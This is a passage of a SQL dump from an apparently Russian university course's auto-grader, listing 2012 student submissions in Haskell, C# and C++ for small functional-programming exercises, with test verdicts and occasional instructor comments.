null, new BinTree(-3) ), new BinTree(7) );\r\n\r\n            Console.WriteLine( bt.Any( x => x % 2 ==  0 ) );\r\n            Console.ReadKey();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1692, 45, '3742311', '2012-10-08 17:22:27', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\n\r\nnamespace Task81\r\n{\r\n    public static class Program\r\n    {\r\n        public static bool HasEvenElement(IEnumerable<IEnumerable<int>> list)\r\n        {\r\n            return list.All(x => x.Any(y => y % 2 == 0));\r\n        }\r\n\r\n        public static void Main(string[] args)\r\n        {\r\n            int[] testList1 = {1, 2, 3, 4};\r\n            int[] testList2 = {34, 423, 53, 1};\r\n            int[] testList3 = {321, 3213, 26};\r\n\r\n            int[][] testList = {testList1, testList2, testList3};\r\n\r\n            Console.WriteLine(HasEvenElement(testList));\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1693, 59, '2562137', '2012-10-08 17:24:13', 1, 'using System;\r\nusing System.Linq;\r\n\r\nnamespace NonZero\r\n{\r\n    class MainClass\r\n    {\r\n    	static int[] nonZeroLastDigits(int[] a) {\r\n    		return a.Select(x => x % 10).Where(x => x != 0).ToArray();\r\n    	}\r\n        static void Main(string[] args)\r\n        {\r\n        	int[] a = {354, 20, 9, 31};\r\n        	int[] b = nonZeroLastDigits(a);\r\n\r\n        	foreach (int i in b) Console.Write(i + " ");\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1694, 59, '472848', '2012-10-08 17:33:16', 1, 'public static int[] nonZeroLastDigits(int[] arr)\r\n{\r\n  return arr.Select(x => x % 10).Where(x => x != 0).ToArray();\r\n}\r\n\r\nstatic void Main(string[] args)\r\n{\r\n  Array.ForEach(nonZeroLastDigits(new int[]{ 123, 239, 30, 336, 261 }), x => Console.Write("{0} ", x));\r\n  Console.WriteLine();\r\n}', '<br/>Тесты успешно пройдены!'),
(1695, 56, '2118411', '2012-10-08 17:35:35', 1, 'allLists n 0 = [[]]\r\nallLists n k = [[x] ++ y | x<-[1..n], y<- allLists n (k-1)]', '<br/>Тесты успешно пройдены!'),
(1696, 59, '2118411', '2012-10-08 17:36:35', 1, '﻿using System;\r\n\r\nusing System.Linq;\r\n\r\n\r\n\r\nnamespace FPTask\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            foreach (uint x in nonZeroLastDigits(new uint[]{354, 20, 9, 31}))\r\n\r\n                Console.WriteLine(x);\r\n\r\n        }\r\n\r\n\r\n\r\n        static uint[] nonZeroLastDigits(uint[] input)\r\n\r\n        {\r\n\r\n            return input.Select(x => x % 10).Where(x => x != 0).ToArray();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1697, 60, '2118411', '2012-10-08 17:37:35', 1, '#include <iostream>\r\n\r\n#include <stdint.h>\r\n\r\n#include <algorithm> \r\n\r\nusing namespace std;\r\n\r\n\r\n\r\nuint32_t* nonZeroLastDigits(uint32_t* a, int n)\r\n\r\n{\r\n\r\n	transform(a, a+n, a, [] (int i) { return i%10; });\r\n\r\n	return remove_if(a, a+n, [] (int i) { return i == 0; });\r\n\r\n}\r\n\r\n\r\n\r\nint main () \r\n\r\n{\r\n\r\n	uint32_t input[] = { 354, 20, 9, 31};\r\n\r\n	int n = sizeof(input)/sizeof(uint32_t);\r\n\r\n	\r\n\r\n	uint32_t* pbegin = input;\r\n\r\n	uint32_t* pend = nonZeroLastDigits(input, n);\r\n\r\n\r\n\r\n	for (uint32_t* p = pbegin; p != pend; p++)\r\n\r\n	{\r\n\r\n		cout << " " << *p;\r\n\r\n	}\r\n\r\n\r\n\r\n	return 0;\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1698, 46, '3742311', '2012-10-08 17:44:55', 1, '#include <algorithm>\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nint IsEven(int n)\r\n{\r\n    return (n + 1) % 2 ;\r\n}\r\n\r\nint main()\r\n{\r\n    const int ARRAY_SIZE = 5 ;\r\n    int testArray[ARRAY_SIZE] = { 1, 3, 2, 5, 7 } ;\r\n    int *location ;\r\n\r\n    location = find_if(testArray, testArray + ARRAY_SIZE, IsEven) ;\r\n\r\n	if (location == testArray + ARRAY_SIZE)\r\n	{\r\n		cout << "Even element not finded";\r\n	}\r\n	else\r\n	{\r\n		cout << "Even element finded";\r\n	}\r\n}', '<br/>Тесты успешно пройдены!'),
(1699, 60, '2562137', '2012-10-08 17:46:54', 1, '#include <iostream>\r\n#include <algorithm>\r\nusing namespace std;\r\n\r\nvoid nonZeroLastDigits(int n, int *a) {\r\n	transform(a, a+n, a, [] (int x) { return x % 10; });\r\n	int *end = remove_if(a, a+n, [] (int x) { return x == 0; });\r\n	for (int *i = a; i != end; i++) cout << *i << " ";\r\n}\r\n\r\nint main()\r\n{\r\n	int a[4] = {354, 20, 9, 31};\r\n	nonZeroLastDigits(4, a);\r\n\r\n	return 0;\r\n}\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1700, 60, '472848', '2012-10-08 17:50:28', 2, '#include <algorithm>        // Это надо написать в начале cpp файла\r\nusing namespace std;\r\n\r\nvoid nonZeroLastDigits(int *a, int num)\r\n{\r\n  int *b = new int[num];\r\n  transform(a, a + num, b, [](int i) {return i % 10;});\r\n  int *c = remove_if(b, b + num, [](int i) {return i == 0;});\r\n  for (int i = 0; i < num; ++i)\r\n  {\r\n    if (c != &b[i]) printf("%i ", b[i]);\r\n       --- Не совсем так, ведь так вы пропустите это число и будете печатать дальше. А надо в этот момент\r\n       --- прекратить печать. Это просто, но исправьте, пожалуйста.\r\n  }\r\n  printf("\r\n");\r\n}\r\n\r\nvoid main()\r\n{\r\n  int a[] = { 123, 239, 30, 336, 261 };\r\n  nonZeroLastDigits(a, 5);\r\n}', '<br/>Тесты успешно пройдены!'),
(1701, 60, '472848', '2012-10-08 18:04:59', 1, '#include <algorithm>        // Это надо написать в начале cpp файла\r\nusing namespace std;\r\n\r\nvoid nonZeroLastDigits(int *a, int num)\r\n{\r\n  int *b = new int[num];\r\n  transform(a, a + num, b, [](int i) {return i % 10;});\r\n  int *c = remove_if(b, b + num, [](int i) {return i == 0;});\r\n  for (int i = 0; i < num; ++i)\r\n  {\r\n    //вот так\r\n    if (c == &b[i]) break;\r\n        --- OK, но кстати можно было просто в заголовке цикла написать  i < c - b \r\n    printf("%i ", b[i]);\r\n  }\r\n  printf("\r\n");\r\n}\r\n\r\nvoid main()\r\n{\r\n  int a[] = { 123, 239, 30, 336, 261 };\r\n  nonZeroLastDigits(a, 5);\r\n}', '<br/>Тесты успешно пройдены!'),
(1702, 46, '4169333', '2012-10-08 18:20:14', 2, '#include "stdafx.h"\r\n#include <algorithm>\r\n#include <iostream>\r\n#include <conio.h>\r\nusing namespace std;\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n	int a[]={1,3,11,7,9,15};\r\n	int n=6;\r\n	int* res;\r\n	res = find_if (a, a+n, [](int x) { return x%2==0; });\r\n	if( *res == a[n] ) \r\n             --- Нет, это не совсем правильно. Мы вообще не можем обращаться к a[n],\r\n             --- потому что в массиве последний элемент имеет индекс a[n-1], и получается\r\n             --- что мы берем элемент вне массива. И там в принципе мб что угодно, в том\r\n             --- числе случайно и совпасть с *res.\r\n             --- Те вообще у вас почти все правильно но тут надо написать немного иначе.\r\n             --- Попробуйте, пожалуйста, скажем до среды.   \r\n	{\r\n		cout << "False";\r\n    } \r\n	else \r\n	{\r\n        cout << "True";\r\n    }       \r\n	getch();\r\n	return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(1703, 45, '4169333', '2012-10-08 18:21:16', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace _1_08_10\r\n{\r\n\r\n    class Program\r\n    {\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            int[][] arr = new int[][]\r\n            { new int[] {1,11,3,5},\r\n              new int[] {1,2,5,7,9,11},\r\n              new int[] {10,11,12,13,14}\r\n            };\r\n           \r\n\r\n            bool b = arr.All (x=> x.Any(x1 => (x1 % 2) == 0));\r\n                \r\n            Console.WriteLine("Result: " + b);\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1704, 46, '4169333', '2012-10-08 19:16:32', 1, '#include "stdafx.h"\r\n#include <algorithm>\r\n#include <iostream>\r\n#include <conio.h>\r\nusing namespace std;\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n	int a[]={1,5,11,7,9,15};\r\n	int n=6;\r\n	int* res;\r\n	res = find_if (a, a+n, [](int x) { return x%2==0; });\r\n	if( res == a+n ) \r\n	{\r\n		cout << "False";\r\n    } \r\n	else \r\n	{\r\n        cout << "True";\r\n    }       \r\n	getch();\r\n	return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(1705, 45, '374969', '2012-10-08 19:21:01', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace ConsoleApplication\r\n{\r\n	class Program\r\n	{\r\n		static void Main(string[] args)\r\n		{\r\n			var b = Check(new[]\r\n			              	{\r\n			              		new[] {1, 2, 3},\r\n			              		new[] {2, 3, 4},\r\n			              	}, x => x%2 == 0);\r\n		}\r\n\r\n		static bool Check<T>(IEnumerable<IEnumerable<T>> arr, Predicate<T> pred)\r\n		{\r\n			return arr.All(x => x.Any(y=>pred(y)));\r\n		}\r\n	}\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1706, 51, '5772638', '2012-10-08 19:39:28', 1, 'repeatFunc f 0 x = x\r\nrepeatFunc f n x = repeatFunc f (n-1) (f x) ', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(1707, 53, '318210', '2012-10-08 19:40:10', 0, 'coins n = [(i, j, k) | i <- [0..(n / 2)], j <- [0..((n - i * 2) / 3)] , k <- [0..((n - i * 2 - j * 3) / 5)],  n == i * 2 + j * 3 + k * 5]', 'Выражение имеет неправильное значение: coins 2'),
(1708, 53, '318210', '2012-10-08 19:43:34', 0, 'coins n = [(i, j, k) | i <- [0..(n `div` 2)], j <- [0..((n - i * 2) `div` 3)] , k <- [0..((n - i * 2 - j * 3) `div` 5)],  n == i * 2 + j * 3 + k * 5]\n', 'Выражение имеет неправильное значение: coins 2'),
(1709, 53, '318210', '2012-10-08 19:44:52', 1, 'coins n = [[i, j, k] | i <- [0..(n `div` 2)], j <- [0..((n - i * 2) `div` 3)] , k <- [0..((n - i * 2 - j * 3) `div` 5)],  n == i * 2 + j * 3 + k * 5]\r\n', '<br/>Тесты успешно пройдены!'),
(1710, 54, 'erwert', '2012-10-08 19:44:53', 1, 'data Scheme = Num Float | Parallel Scheme Scheme | Series Scheme Scheme deriving(Show,Eq)\r\n\r\ntotalResistance (Num n) = n\r\ntotalResistance (Series a b) = totalResistance a + totalResistance b\r\ntotalResistance (Parallel a b) = c * d / (c + d)\r\n	where\r\n		c = totalResistance a\r\n		d = totalResistance b', '<br/>Тесты успешно пройдены!'),
(1711, 51, '44060', '2012-10-08 19:54:53', 1, 'Без этого начального значения функция свертки не преобразовывает типы (получается, что она ждет тип a->b, но получает тип [a])\r\n  --- Ну OK, засчитано, а как более правильно, мы разберем.', 'Не удалось вычислить выражение "(repeatFunc (*2) 3) 1", проверьте правильность синтаксиса'),
(1712, 56, '5772638', '2012-10-08 20:11:36', 1, 'allLists n 1= [[x]|x<-[1..n]]\r\nallLists n k=[x:xs|x<-[1..n],xs<-allLists n (k-1)]', '<br/>Тесты успешно пройдены!'),
(1713, 46, '419046', '2012-10-08 20:12:16', 1, '#include <iostream>\r\n#include <algorithm>\r\n#include <vector>\r\nusing namespace std;\r\n\r\n\r\n\r\nint main () {\r\n  vector<int> myvector;\r\n  vector<int>::iterator it;\r\n\r\n  myvector.push_back(9);\r\n  myvector.push_back(9);\r\n  myvector.push_back(2);\r\n  myvector.push_back(9);\r\n\r\n  it = find_if (myvector.begin(), myvector.end(), [](int x) {return ((x%2)==0); });\r\n \r\n  if (it == myvector.end())\r\n    cout << "Not founded" << endl;\r\n      --- Не по теме курса, но вроде правильнее "Not found" (find - неправильноый глагол) :) \r\n  else\r\n     cout  << *it << endl;\r\n  return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(1714, 52, '318210', '2012-10-08 20:26:03', 0, 'repeatFunc f n = foldr (x res -> f.res) f [1..(n - 1)]', '<br/>Тесты успешно пройдены!'),
(1715, 52, '318210', '2012-10-08 20:26:28', 0, 'repeatFunc f n = foldr (x res -> f.res) [1..n]', 'Не удалось вычислить выражение "repeatFunc (*2) 3 10", проверьте правильность синтаксиса'),
(1716, 51, '318210', '2012-10-08 20:27:25', 1, 'repeatFunc f n = foldr (x res -> f.res) f [1..(n - 1)]', '<br/>Тесты успешно пройдены!'),
(1717, 56, '472848', '2012-10-08 20:52:32', 1, 'allLists n 1 = [[i]|i <- [1..n]]\r\nallLists n k = [i:xs| i <- [1..n], xs <- (allLists n (k-1))]', '<br/>Тесты успешно пройдены!'),
(1718, 56, 'erwert', '2012-10-09 00:14:15', 1, 'allLists n 1 = [[t] | t <- [1..n]]\r\nallLists n k = gen (allLists n (k - 1)) n\r\ngen l n = [ (t:el) | el <- l, t<- [1..n]]', '<br/>Тесты успешно пройдены!'),
(1719, 53, '3742311', '2012-10-09 07:50:41', 1, 'coins n = filter ([a,b,c] -> a * 2 + b * 3 + c * 5 == n) [[i,j,k] | i <- [0..(div n 2)], j <- [0..(div n 3)], k <- [0..(div n 5)]]', '<br/>Тесты успешно пройдены!'),
(1720, 47, '4837959', '2012-10-09 08:47:39', 0, 'powerset [x] = [[], [x]]\r\npowerset (x:xs) = let\r\n                    tailset = powerset xs\r\n                  in tailset ++ map (ys -> (x:ys)) tailset\r\n', 'Не удалось вычислить выражение "powerset []", проверьте правильность синтаксиса'),
(1721, 47, '4837959', '2012-10-09 08:48:15', 0, 'powerset [] = []\r\npowerset [x] = [[], [x]]\r\npowerset (x:xs) = let\r\n                    tailset = powerset xs\r\n                  in tailset ++ map (ys -> (x:ys)) tailset\r\n', 'Выражение имеет неправильное значение: powerset []'),
(1722, 47, '4837959', '2012-10-09 08:48:32', 1, 'powerset [] = [[]]\r\npowerset [x] = [[], [x]]\r\npowerset (x:xs) = let\r\n                    tailset = powerset xs\r\n                  in tailset ++ map (ys -> (x:ys)) tailset\r\n', '<br/>Тесты успешно пройдены!'),
(1723, 54, '3742311', '2012-10-09 09:50:48', 1, 'data Scheme = Scheme Scheme | (Scheme, Scheme) | Double\r\n\r\ntotalResistance (a b) = totalResistance a + totalResistance b\r\ntotalResistance (a, b) = totalResistance a * totalResistance b / (totalResistance a + totalResistance b)\r\ntotalResistance d = d', '<br/>Тесты успешно пройдены!'),
(1724, 48, '4837959', '2012-10-09 09:57:45', 1, 'myreverse xs = foldr (x y z -> y (x:z)) id xs []', '<br/>Тесты успешно пройдены!'),
(1725, 51, '4837959', '2012-10-09 10:07:40', 1, 'repeatFunc f n = foldr (.) id (replicate n f)', '<br/>Тесты успешно пройдены!'),
(1726, 52, '4837959', '2012-10-09 10:07:52', 1, 'repeatFunc f n = foldr (.) id (replicate n f)', '<br/>Тесты успешно пройдены!'),
(1727, 53, '4837959', '2012-10-09 10:21:39', 1, 'coins n = let\r\n            klimit = div n 2\r\n            llimit = div n 3\r\n            mlimit = div n 5\r\n          in [[k,l,m] | k <- [0..klimit], l <- [0..llimit], m <- [0..mlimit], 2 * k + 3 * l + 5 * m == n]\r\n', '<br/>Тесты успешно пройдены!'),
(1728, 54, '4837959', '2012-10-09 10:40:54', 1, 'data Scheme = R Double | Series Scheme Scheme | Parallel Scheme Scheme\r\n\r\ntotalResistance (R r) = r\r\ntotalResistance (Series s1 s2) = totalResistance s1 + totalResistance s2\r\ntotalResistance (Parallel s1 s2) = let\r\n                                    r1 = totalResistance s1\r\n                                    r2 = totalResistance s2\r\n                                   in r1 * r1 / (r1 + r2)\r\n\r\n--Test: totalResistance (Series (R 4) (R 8))\r\n--Output: 12.9\r\n--Test: totalResistance (Parallel (R 4) (R 4))\r\n--Output: 2.0\r\n--Test: totalResistance (Parallel (Series (R 2) (R 3)) (R 4))\r\n--Output: 2.77777777777778\r\n', '<br/>Тесты успешно пройдены!'),
(1729, 53, '528420', '2012-10-09 11:51:04', 1, 'coins n =[(x,y,z) | x<-[0..(n`div`2)], y<-[0..(n`div`3)], z<-[0..(n`div`5)], 2*x+3*y+5*z == n]', 'Выражение имеет неправильное значение: coins 2'),
(1730, 51, '1384577', '2012-10-09 12:47:13', 1, 'repeatFunc f n = foldr (.) id (replicate n f)', '<br/>Тесты успешно пройдены!'),
(1731, 52, '1384577', '2012-10-09 12:47:31', 1, 'repeatFunc f n = foldr (.) id (replicate n f)', '<br/>Тесты успешно пройдены!'),
(1732, 53, '1384577', '2012-10-09 12:59:18', 1, 'coins n = [[i,j,k] | i <- [0..n], j <- [0..n], k <- [0..n], 2*i+3*j+5*k == n ]', '<br/>Тесты успешно пройдены!'),
(1733, 48, '1384577', '2012-10-09 13:47:29', 1, 'myreverse xs = foldr f id xs [] where f x r = r . (x:)', '<br/>Тесты успешно пройдены!'),
(1734, 49, '318210', '2012-10-09 14:44:23', 1, '﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace TreeAny101\r\n\r\n{\r\n\r\n    public class MyNode \r\n\r\n    {\r\n\r\n        private int value;\r\n\r\n\r\n\r\n        public int getValue()\r\n\r\n        {\r\n\r\n            return this.value;\r\n\r\n        }\r\n\r\n        public void setValue(int val)\r\n\r\n        {\r\n\r\n            this.value = val;\r\n\r\n        }\r\n\r\n\r\n\r\n        public MyNode(int _value)\r\n\r\n        {\r\n\r\n            value = _value;\r\n\r\n        }\r\n\r\n    }\r\n\r\n    public class MyTree\r\n\r\n    {\r\n\r\n        private MyNode root;\r\n\r\n        private MyTree left;\r\n\r\n        private MyTree right;\r\n\r\n\r\n\r\n\r\n\r\n        public MyTree(MyNode _root)\r\n\r\n        {\r\n\r\n            root = _root;\r\n\r\n            left = null;\r\n\r\n            right = null;\r\n\r\n        }\r\n\r\n        public MyTree(MyNode _root, MyTree _left, MyTree _right)\r\n\r\n        {\r\n\r\n            root = _root;\r\n\r\n            left = _left;\r\n\r\n            right = _right;\r\n\r\n        }\r\n\r\n\r\n\r\n        // список значений в вершинах дерева\r\n\r\n        public List<int> countNodes()\r\n             --- Вообще это очень нерациональное решение, потому что вы составляете список из всех узлов,\r\n             --- а для того чтобы ответить на вопрос, есть такой элемент или нет, достаточно было бы\r\n             --- только части элементов. Но ОК, зато оригинально) - те засчитано. Можно было бы кстати\r\n             --- тут написать генератор, который сознает не список, а Enumerable, и тогда получилось\r\n             --- бы эффективно. Я может потом и дам такого типа задачу, кстати - спасибо за хорошую идею :) \r\n        {\r\n\r\n            List<int> listofNodes = new List<int>();\r\n\r\n            listofNodes.Add(root.getValue());\r\n\r\n            if (this.left == null && this.right == null)\r\n\r\n            {\r\n\r\n                return listofNodes;\r\n\r\n            }\r\n\r\n            if (this.left != null)\r\n\r\n            {\r\n\r\n                listofNodes.AddRange(this.left.countNodes());\r\n\r\n            }\r\n\r\n            if (this.right != null)\r\n\r\n            {\r\n\r\n                listofNodes.AddRange(this.right.countNodes());\r\n\r\n            }\r\n\r\n            return listofNodes;\r\n\r\n        }\r\n\r\n        public bool treeAny(Predicate<int> pred)\r\n\r\n        {\r\n\r\n            List<int> any = this.countNodes().FindAll(pred);\r\n\r\n            if (any.Count > 0)\r\n\r\n            {\r\n\r\n                return true;\r\n\r\n            }\r\n\r\n            else\r\n\r\n            {\r\n\r\n                return false;\r\n\r\n            }\r\n\r\n        }\r\n\r\n    }\r\n\r\n\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        public static bool func(int arg)\r\n\r\n        {\r\n\r\n            return arg > 4;\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            MyNode node1 = new MyNode(1);\r\n\r\n            MyNode node2 = new MyNode(3);\r\n\r\n            MyNode node3 = new MyNode(5);\r\n\r\n            MyTree tree1 = new MyTree(node3);\r\n\r\n            MyTree tree2 = new MyTree(node2);\r\n\r\n            MyTree tree = new MyTree(node1, tree1, tree2);\r\n\r\n\r\n\r\n            Predicate<int> pred = new Predicate<int>(func);\r\n\r\n            Console.WriteLine(tree.treeAny(pred));\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1735, 48, 'Маргарита Нурмухаметова', '2012-10-09 15:44:59', 1, 'fol f a xs = foldr ( g x -> g (f x b)) id xs a\r\n\r\n\r\n\r\nmyreverse z = fol (x y -> y:x) [] z \r\n', '<br/>Тесты успешно пройдены!'),
(1736, 51, 'Маргарита Нурмухаметова', '2012-10-09 15:45:27', 1, 'repeatFunc::(a->a)->Int->(a->a)\r\n\r\nrepeatFunc f 1 = f\r\n\r\nrepeatFunc f n = f.(repeatFunc f (n-1))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1737, 52, 'Маргарита Нурмухаметова', '2012-10-09 15:45:48', 1, 'repeatFunc::(a->a)->Int->(a->a)\r\n\r\nrepeatFunc f n = foldl (.) (head x) (tail x) where x = (take n (repeat f))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1738, 53, 'Маргарита Нурмухаметова', '2012-10-09 15:46:02', 1, 'coins n = [[x,y,z]|x<-[0..n],y<-[0..n],z<-[0..n],2*x+3*y+5*z==n]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1739, 54, 'Маргарита Нурмухаметова', '2012-10-09 15:46:48', 1, 'data Scheme = R Float|C Scheme Scheme|P Scheme Scheme\r\n\r\ntotalResistance (R x) = x\r\n\r\ntotalResistance (C x y) = totalResistance x + totalResistance y\r\n\r\ntotalResistance (P x y) = (/) (totalResistance x * totalResistance y) (totalResistance x + totalResistance y)\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1740, 51, '9539826', '2012-10-09 15:47:52', 1, 'repeatFunc1 f g 1 = f\r\nrepeatFunc1 f g n = repeatFunc1 (g . f) (g) (n-1)\r\nrepeatFunc f n = repeatFunc1 f f n', '<br/>Тесты успешно пройдены!'),
(1741, 60, 'tonyo', '2012-10-09 18:12:51', 1, '#include <iostream>\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\nconst int maxn = 10; \r\n\r\nvoid nonZeroLastDigits(int ar[], int size)  \r\n{\r\n    if (size > maxn)\r\n    {   \r\n        cerr << "Size error\r\n";\r\n        return;                                                                                                                                                                                 \r\n    }\r\n\r\n    int b[maxn];\r\n    transform(ar, ar+maxn, b, [](int x){ return x % 10; });\r\n    int *end = remove_if(b, b+size, [](int x){ return x == 0; });\r\n    for (int *i = b; i < end; i++)\r\n    {\r\n        cout << *i << " ";\r\n    }\r\n} \r\n\r\n\r\nint main()\r\n{\r\n    int ar[] = {354, 20, 9, 31, 58, 31, 40};\r\n    int size = sizeof(ar)/sizeof(int);\r\n\r\n    nonZeroLastDigits(ar, size);\r\n    return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(1742, 59, 'Deutsche', '2012-10-09 18:21:32', 1, 'This problem was sent by email, accept it please', '<br/>Тесты успешно пройдены!'),
(1743, 52, 'sromanov', '2012-10-09 18:44:55', 1, 'repeatFunc f n = foldl (acc _ -> f . acc) id [1..n]', '<br/>Тесты успешно пройдены!'),
(1744, 51, 'sromanov', '2012-10-09 18:45:08', 1, 'repeatFunc f n = foldl (acc _ -> f . acc) id [1..n]', '<br/>Тесты успешно пройдены!'),
(1745, 52, '17107004', '2012-10-09 18:51:43', 1, '\r\nrepeatFunc fn n = foldr ( _ y -> fn . y) id [1..n]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1746, 51, '17107004', '2012-10-09 18:54:28', 1, '\r\nrepeatFunc fn n = foldr ( _ y -> fn . y) id [1..n]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1747, 53, '17107004', '2012-10-09 19:10:17', 1, '\r\nt n = floor (n / 2)\r\n\r\n\r\n\r\ncoins n = let \r\n\r\n	l1 = div n 2\r\n\r\n	l2 = div n 3\r\n\r\n	l3 = div n 5 in\r\n\r\n	[[i, j, k] | \r\n\r\n	i <- [0..l1],\r\n\r\n	j <- [0..l2], \r\n\r\n	k <- [0..l3], \r\n\r\n	2 * i + 3 *j + 5 * k == n]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1748, 52, '985727', '2012-10-09 19:38:05', 1, 'g f n = map (x->f) [1..n]\r\nrepeatFunc f n = foldl (.) f (g f (n-1))', '<br/>Тесты успешно пройдены!'),
(1749, 51, '985727', '2012-10-09 19:38:22', 1, 'g f n = map (x->f) [1..n]\r\nrepeatFunc f n = foldl (.) f (g f (n-1))', '<br/>Тесты успешно пройдены!'),
(1750, 54, '17107004', '2012-10-09 19:46:00', 1, '\r\ndata Scheme = R Float | Parallel Scheme Scheme | Sequential Scheme Scheme deriving (Show)\r\n\r\n\r\n\r\ntotalResistance (R val) = val\r\n\r\ntotalResistance (Parallel x y) = let a = totalResistance x\r\n\r\n				     b = totalResistance y\r\n\r\n				 in (a * b) / (a + b)\r\n\r\ntotalResistance (Sequential x y) = (totalResistance x) + (totalResistance y)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1751, 52, '318210', '2012-10-09 19:48:42', 0, 'repeatFunc f n = foldr (x res -> f.res) f [1..(n - 1)]', 'Не удалось вычислить выражение "repeatFunc (*2) 3 10", проверьте правильность синтаксиса'),
(1752, 52, '318210', '2012-10-09 19:49:02', 0, 'repeatFunc f n = foldr (x res -> f.res) f [1..(n - 1)]', 'Не удалось вычислить выражение "repeatFunc (*2) 3 10", проверьте правильность синтаксиса'),
(1753, 52, '318210', '2012-10-09 19:49:42', 1, 'repeatFunc f n = foldr (x res -> f.res) f [1..(n - 1)]', '<br/>Тесты успешно пройдены!'),
(1754, 54, '318210', '2012-10-09 19:50:37', 1, 'Problem sent by mail', '<br/>Тесты успешно пройдены!'),
(1755, 50, '318210', '2012-10-09 19:50:48', 1, 'Problem sent by mail', '<br/>Тесты успешно пройдены!'),
(1756, 56, '17107004', '2012-10-09 19:57:37', 1, '\r\nallLists n k = (iterate ( x -> [ (y:z) | y <- [1..n], z <- x]) [[]] ) !! k\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1757, 53, '985727', '2012-10-09 20:02:02', 0, 'f i j k = i*2 +j*3 + k*5\r\ncoins n = [ (i,j,k) | i <- [0..(div n 2)], j <- [0..(div n 3)], k<-[0..(div n 5)] , f i j k == n ]\r\n', 'Выражение имеет неправильное значение: coins 2'),
(1758, 53, '985727', '2012-10-09 20:03:53', 1, 'f i j k = i*2 +j*3 + k*5\r\ncoins n = [ [i,j,k] | i <- [0..(div n 2)], j <- [0..(div n 3)], k<-[0..(div n 5)] , f i j k == n ]', '<br/>Тесты успешно пройдены!'),
(1759, 54, '985727', '2012-10-09 20:24:27', 1, 'data Scheme = Resist Double | Parall Scheme Scheme | Seq Scheme Scheme\r\n\r\ntotalResistance (Resist x) = x\r\ntotalResistance (Seq x y) = totalResistance  x + totalResistance  y\r\ntotalResistance (Parall x y) = totalResistance x * totalResistance y / (totalResistance x + totalResistance  y)', '<br/>Тесты успешно пройдены!'),
(1760, 60, 'Deutsche', '2012-10-09 20:47:04', 1, '// Задача 13.2 Чистяков П.П. гр. 543\r\n#include <algorithm> \r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\n// печать на экран вынесена из функции в main, просто возвращается искомый массив (в его нулевом элементе его длина)\r\nstatic int* nonZeroLastDigits(int* a, int n)\r\n{\r\n	int* b = new int[n];\r\n	transform(a, a+25, b, [] (int i) { return i%10; });\r\n	int* d = remove_if(b, b+25, [] (int i) { return (i == 0); });\r\n	int* c = new int[26-*d];\r\n	c[0] = 26-*d;\r\n	for (int i = 0; i<(25-*d); i++)\r\n		c[i+1] = b[i];\r\n	return c;\r\n}\r\n\r\nint main()\r\n{\r\n	int ar[25] = { 45, 32, 54, 10, 21, 85, 52, 26, 40, 84, 25, 24, 450, 42, 3268, 2350, 32, 4, 9, 46, 79, 40, 235, 2590, 63 };\r\n    cout << "Source array:\r\n";\r\n    for (int i = 0; i <= 24; i++)\r\n        cout << ar[i] << "   ";\r\n    cout << "\r\n\r\n";\r\n\r\n    int* res = nonZeroLastDigits(ar, 25);\r\n\r\n    cout << "Result array:\r\n" ;\r\n    for (int i = 1; i<res[0]; i++)\r\n		cout << res[i] << "   ";\r\n    cout << "\r\n";\r\n\r\n	char a;\r\n	cin >> a;\r\n	return 0;\r\n}\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1761, 56, '985727', '2012-10-09 20:52:24', 0, 'allLists n 0 = [[]]\r\nallLists n k = [ [x:xs] | x<-[1..n], xs<-g n (k-1)]\r\n', 'Не удалось вычислить выражение "allLists 1 1", проверьте правильность синтаксиса'),
(1762, 56, '985727', '2012-10-09 20:53:49', 1, 'allLists n 0 = [[]]\r\nallLists n k = [ x:xs | x<-[1..n], xs<-allLists n (k-1)]\r\n', '<br/>Тесты успешно пройдены!'),
